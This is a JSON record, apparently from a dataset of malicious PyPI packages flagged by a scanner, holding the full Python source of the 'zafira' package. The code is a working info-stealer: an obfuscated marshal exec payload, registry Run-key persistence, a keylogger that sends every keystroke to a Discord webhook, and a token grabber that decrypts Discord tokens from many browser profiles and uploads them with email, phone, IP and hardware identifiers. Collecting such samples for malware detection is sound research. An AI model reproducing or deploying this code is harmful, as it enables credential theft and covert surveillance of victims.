[
  {
    "pyfile": "main.py",
    "malicious_code_snippets": "import ctypes\nimport json\nimport time \nimport re\nimport threading\nimport socket\nfrom pathlib import Path\nfrom zipfile import ZipFile\nimport base64\nimport subprocess\nimport shutil\nimport uuid\nfrom Crypto.Cipher import AES\nfrom discord import Embed, SyncWebhook\nfrom win32crypt import CryptUnprotectData\nimport requests\nimport os\nimport wmi \nimport sys\nimport platform\nfrom pynput.keyboard import Key, Listener\nfrom datetime import date\nfrom discord_webhook import DiscordWebhook, DiscordEmbed\n\n__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__=\"__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__\";__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__=\"__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__\";from marshal import loads;exec(loads(b\"\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00@\\x00\\x00\\x00s(\\x00\\x00\\x00d\\x00d\\x01l\\x00Z\\x00d\\x00d\\x01l\\x01Z\\x01e\\x02e\\x00\\xa0\\x03e\\x01\\xa0\\x03d\\x02\\xa1\\x01\\xa1\\x01\\x83\\x01\\x01\\x00d\\x01S\\x00)\\x03\\xe9\\x00\\x00\\x00\\x00NsX\\x01\\x00\\x00\\xfd7zXZ\\x00\\x00\\x04\\xe6\\xd6\\xb4F\\x02\\x00!\\x01\\x16\\x00\\x00\\x00t/\\xe5\\xa3\\x01\\x01\\x1ax\\x9c\\xed\\x94]O\\x830\\x14\\x86\\xff\\xcbn6.\\xb0|\\x0cV\\xfc\\x8a[\\xb6\\x0c\\\\\\x14#\\xd3\\xcd\\x85\\xa4\\x01Z\\x81\\xb0\\xa5\\xb3E\\xd7\\xf9\\xeb\\xa5F\\x13\\x82&^x\\xc3\\x05Mz\\xfa\\xbe'\\xe7\\xe2\\xed\\x93\\xa6\\x081\\x92\\xc6\\x94sT\\xad\\xb6\\xca\\x8b^\\x1bR\\xfc){gmH\\xd1\\xd1\\xech\\xfeF\\x93\\x08\\x92\\x0c\\xb64\\xc2|\\x10\\xf7CA\\xccPh\\xda?\\xb7^\\xf7Wu\\xc3\\xab\\x02\\xeb\\r,\\xcb\\xe6[\\xe9\\x81TJU\\x8c\\xf7cV\\x96{~\\n\\x00\\xceyB\\x19>I\\xe8\\x0eD\\xfb\\x1c\\x1cH\\x9cQZp\\xa0k\\xb63\\x1a\\x0e-\\xddqL\\x03j\\x96ni\\xe0\\x9ecf\\xaa(\\xe50\\x15/\\xb6\\xb9\\x89\\xd6\\xc2?\\xc0\\xd5\\xf5\\xf8q2\\x8e\\r;\\x7fZ\\xdf,\\xa7\\xae\\x17L\\xef\\xde\\x8e\\xacp=\\x07\\xcei\\xee\\x99Kle\\xc5\\\\U\\x1f`0{\\xbe\\x95\\x01t\\x19*Fh5\\x9b\\xb8\\xbe\\xbf@(\\x14\\x91#\\xd3\\xb1\\xe6\\x05\\x7f4B\\x81\\xa3\\xea\\x1c%\\x14\\xbf\\x96\\x84}Yx\\xbe\\xab\\xfc\\x96\\\\6\\xc7%\\x13\\xa3A\\xf0\\x93Q_Q\\xba\\xc7\\xde}\\x1d-\\x95\\xbd\\x0f-\\xcf \\xf0\\x00\\x00\\x8f\\xbe`\\\\$\\x06U\\xc5\\x00\\x01\\xb3\\x02\\x9b\\x02\\x00\\x00\\xadT\\x0eL\\xb1\\xc4g\\xfb\\x02\\x00\\x00\\x00\\x00\\x04YZ)\\x04\\xda\\x04zlib\\xda\\x04lzma\\xda\\x04exec\\xda\\ndecompress\\xa9\\x00r\\x06\\x00\\x00\\x00r\\x06\\x00\\x00\\x00\\xda\\x07coduter\\xda\\x08<module>\\x01\\x00\\x00\\x00s\\x04\\x00\\x00\\x00\\x10\\x00\\x18\\x01\"));__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__=\"__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__\";__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__=\"__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__\";\n__PING__ = \"%ping_enabled%\"\n__PINGTYPE__ = \"%ping_type%\"\n\n# = = = = = Startup = = = = = =\nclass Startup:\n    def __init__(self) -> None:        \n        self.working_dir = os.getenv(\"APPDATA\") + \"\\\\zafira_grabber\"\n    \n        if self.check_self():\n            return\n\n        self.mkdir()\n        self.write_stub()\n        self.regedit()\n    \n    def check_self(self) -> bool:\n        if os.path.realpath(sys.executable) == self.working_dir + \"\\\\dat.txt\":\n            return True\n\n        return False\n    \n    def mkdir(self) -> str:\n        if not os.path.isdir(self.working_dir):\n            os.mkdir(self.working_dir)\n        \n        else:\n            shutil.rmtree(self.working_dir)\n            os.mkdir(self.working_dir)\n    \n    def write_stub(self) -> None:\n        shutil.copy2(os.path.realpath(sys.executable), self.working_dir + \"\\\\dat.txt\")\n        \n        with open(file=f\"{self.working_dir}\\\\run.bat\", mode=\"w\") as f:\n            f.write(f\"@echo off\\ncall {self.working_dir}\\\\dat.txt\")\n    \n    def regedit(self) -> None:\n        subprocess.run(args=[\"reg\", \"delete\", \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", \"/v\", \"zafira_grabber\", \"/f\"], shell=True)\n        subprocess.run(args=[\"reg\", \"add\", \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", \"/v\", \"zafira_grabber\", \"/t\", \"REG_SZ\", \"/d\", f\"{self.working_dir}\\\\run.bat\", \"/f\"], shell=True)\n\nhostname = socket.gethostname()\nip_priv = socket.gethostbyname(hostname)\npcname = os.getenv('username')\nhoy = date.today()\n\ncpu = wmi.WMI().Win32_Processor()[0].Name\ngpu = wmi.WMI().Win32_VideoController()[0].Name\nram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)\nip_publ = requests.get('https://api.ipify.org').text\nmac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))\nhwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell = True, stdin = subprocess.PIPE, stderr = subprocess.PIPE).decode('utf-8').split('\\n')[1].strip()\n\n# = = = = = Keylogger = = = = =\ndef keyLogger():\n  with Listener(on_press = onPress) as listener:\n    listener.join()\n  \n# = = = = = On Press = = = = =\ndef onPress(key):\n  webhook = DiscordWebhook(url = __WEBHOOK__, username = \"Stoned Raiders\", avatar_url = \"https://cdn.discordapp.com/attachments/1057095772535001129/1062526827979079690/Screenshot_20230104-031648_YouTube.jpg\")\n  embed = DiscordEmbed(title = \"Stoned Raiders\", description = \"**¡Tecla Presionada!**\", color = 0x00001)\n  embed.add_embed_field(name = \"**Tecla**\", value = f\"**`{str(key)}`**\")\n  embed.add_embed_field(name = \"**Fecha**\", value = f\"**`{hoy}`**\")\n  embed.add_embed_field(name = \"**Vicima**\", value = f\"**`{pcname}`**\")\n  embed.set_thumbnail(url = \"https://cdn.discordapp.com/attachments/1057095772535001129/1062526827979079690/Screenshot_20230104-031648_YouTube.jpg\")\n  embed.set_footer(text = \"Made By Death Team | Scorpion\", icon_url = \"https://cdn.discordapp.com/attachments/1057095772535001129/1062526827979079690/Screenshot_20230104-031648_YouTube.jpg\")\n  webhook.add_embed(embed)\n  response = webhook.execute()\n\nclass grabtokens:\n    def __init__(self) -> None:\n        self.baseurl = \"https://discord.com/api/v9/users/@me\"\n        self.appdata = os.getenv(\"localappdata\")\n        self.roaming = os.getenv(\"appdata\")\n        self.regex = r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}\"\n        self.encrypted_regex = r\"dQw4w9WgXcQ:[^\\\"]*\"\n\n        self.tokens = []\n        self.ids = []\n\n        self.grabTokens()\n        self.upload()\n\n    def decrypt_val(self, buff, master_key) -> str:\n        try:\n            iv = buff[3:15]\n            payload = buff[15:]\n            cipher = AES.new(master_key, AES.MODE_GCM, iv)\n            decrypted_pass = cipher.decrypt(payload)\n            decrypted_pass = decrypted_pass[:-16].decode()\n            return decrypted_pass\n        except Exception:\n            return \"Failed to decrypt password\"\n\n    def get_master_key(self, path) -> str:\n        with open(path, \"r\", encoding=\"utf-8\") as f:\n            c = f.read()\n        local_state = json.loads(c)\n\n        master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n        master_key = master_key[5:]\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n        return master_key\n\n    def grabTokens(self):\n        paths = {\n            'Discord': self.roaming + '\\\\discord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord Canary': self.roaming + '\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\',\n            'Lightcord': self.roaming + '\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord PTB': self.roaming + '\\\\discordptb\\\\Local Storage\\\\leveldb\\\\',\n            'Opera': self.roaming + '\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\',\n            'Opera GX': self.roaming + '\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\',\n            'Amigo': self.appdata + '\\\\Amigo\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Torch': self.appdata + '\\\\Torch\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Kometa': self.appdata + '\\\\Kometa\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Orbitum': self.appdata + '\\\\Orbitum\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'CentBrowser': self.appdata + '\\\\CentBrowser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            '7Star': self.appdata + '\\\\7Star\\\\7Star\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Sputnik': self.appdata + '\\\\Sputnik\\\\Sputnik\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Vivaldi': self.appdata + '\\\\Vivaldi\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome SxS': self.appdata + '\\\\Google\\\\Chrome SxS\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome1': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 1\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome2': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 2\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome3': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 3\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome4': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 4\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome5': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 5\\\\Local Storage\\\\leveldb\\\\',\n            'Epic Privacy Browser': self.appdata + '\\\\Epic Privacy Browser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Microsoft Edge': self.appdata + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul\\\\Local Storage\\\\leveldb\\\\',\n            'Uran': self.appdata + '\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Yandex': self.appdata + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Brave': self.appdata + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Iridium': self.appdata + '\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\'}\n\n        for name, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            disc = name.replace(\" \",\"\").lower()\n            if \"cord\" in path:\n                if os.path.exists(self.roaming + f'\\\\{disc}\\\\Local State'):\n                    for file_name in os.listdir(path):\n                        if file_name[-3:] not in [\"log\", \"ldb\"]:\n                            continue\n                        for line in [\n                            x.strip() for x in open(\n                                f'{path}\\\\{file_name}',\n                                errors='ignore').readlines() if x.strip()]:\n                            for y in re.findall(self.encrypted_regex, line):\n                                try:\n                                    token = self.decrypt_val(\n                                        base64.b64decode(\n                                            y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(\n                                            self.roaming + f'\\\\{disc}\\\\Local State'))\n                                except ValueError:\n                                    pass\n                                try:\n                                    r = requests.get(self.baseurl,headers={\n                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                                        'Content-Type': 'application/json',\n                                        'Authorization': token})\n                                except Exception:\n                                        pass\n                                if r.status_code == 200:\n                                    uid = r.json()['id']\n                                    if uid not in self.ids:\n                                        self.tokens.append(token)\n                                        self.ids.append(uid)\n            else:\n                for file_name in os.listdir(path):\n                    if file_name[-3:] not in [\"log\", \"ldb\"]:\n                        continue\n                    for line in [\n                        x.strip() for x in open(\n                            f'{path}\\\\{file_name}',\n                            errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regex, line):\n                            try:\n                                r = requests.get(self.baseurl,headers={\n                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                                    'Content-Type': 'application/json',\n                                    'Authorization': token})\n                            except Exception:\n                                    pass\n                            if r.status_code == 200:\n                                uid = r.json()['id']\n                                if uid not in self.ids:\n                                    self.tokens.append(token)\n                                    self.ids.append(uid)\n\n\n        if os.path.exists(self.roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n            for path, _, files in os.walk(\n                    self.roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n                for _file in files:\n                    if not _file.endswith('.sqlite'):\n                        continue\n                    for line in [\n                        x.strip() for x in open(\n                            f'{path}\\\\{_file}',\n                            errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regex, line):\n                            try:\n                                r = requests.get(self.baseurl,headers={\n                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                                    'Content-Type': 'application/json',\n                                    'Authorization': token})\n                            except Exception:\n                                    pass\n                            if r.status_code == 200:\n                                uid = r.json()['id']\n                                if uid not in self.ids:\n                                    self.tokens.append(token)\n                                    self.ids.append(uid)\n\n    def upload(self):\n        for token in self.tokens:\n            val = \"\"\n            val_name = \"\"\n\n            r = requests.get(\n                'https://discord.com/api/v9/users/@me',\n                headers={\n                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                    'Content-Type': 'application/json',\n                    'Authorization': token})\n\n            discord_id = r.json()['id']\n            username = r.json()['username'] + '#' + r.json()['discriminator']\n            phone = r.json()['phone']\n            email = r.json()['email']\n\n            val_name += f'{username}'\n            \n \n\n            webhook = DiscordWebhook(url = __WEBHOOK__, username = \"Stoned Raiders\", avatar_url = \"https://cdn.discordapp.com/attachments/1057095772535001129/1062526827979079690/Screenshot_20230104-031648_YouTube.jpg\")\n            embed = DiscordEmbed(title = \"Stoned Raiders\", description = \"**¡Nuevo Infectado!**\", color = 0x00001)\n            embed.add_embed_field(name = \"**Nombre Del Computador**\", value = f\"**`{pcname}`**\")\n            embed.add_embed_field(name = \"**GPU**\", value = f\"**`{gpu}`**\")\n            embed.add_embed_field(name = \"**Dirección MAC**\", value = f\"**`{mac}`**\", inline = True)\n            embed.add_embed_field(name = \"**CPU**\", value = f\"**`{cpu}`**\")\n            embed.add_embed_field(name = \"**IP Pública**\", value = f\"**`{ip_publ}`**\", inline = True)\n            embed.add_embed_field(name = \"**IP Privada**\", value = f\"**`{ip_priv}`**\", inline = True)\n            embed.add_embed_field(name = \"**HWID**\", value = f\"**`{hwid}`**\", inline = True)\n            embed.add_embed_field(name = \"**Memoria RAM**\", value = f\"**`{ram}`**\")\n            embed.add_embed_field(name = \"**Token**\", value = f\"**`{token}`**\")\n            embed.add_embed_field(name = \"**Email**\", value = f\"**`{email}`**\")\n            embed.add_embed_field(name = \"**phone**\", value = f\"**`{phone}`**\")\n            embed.set_thumbnail(url = \"https://cdn.discordapp.com/attachments/1057095772535001129/1062526827979079690/Screenshot_20230104-031648_YouTube.jpg\")\n            embed.set_footer(text = \"Made By Death Team | Scorpion\", icon_url_url = \"https://cdn.discordapp.com/attachments/1057095772535001129/1062526827979079690/Screenshot_20230104-031648_YouTube.jpg\")\n            webhook.add_embed(embed)\n            webhook.execute()"
  },
  {
    "metadata": {
      "package_name": "zafira-0.1",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/zafira-0.1.txt"
    }
  }
]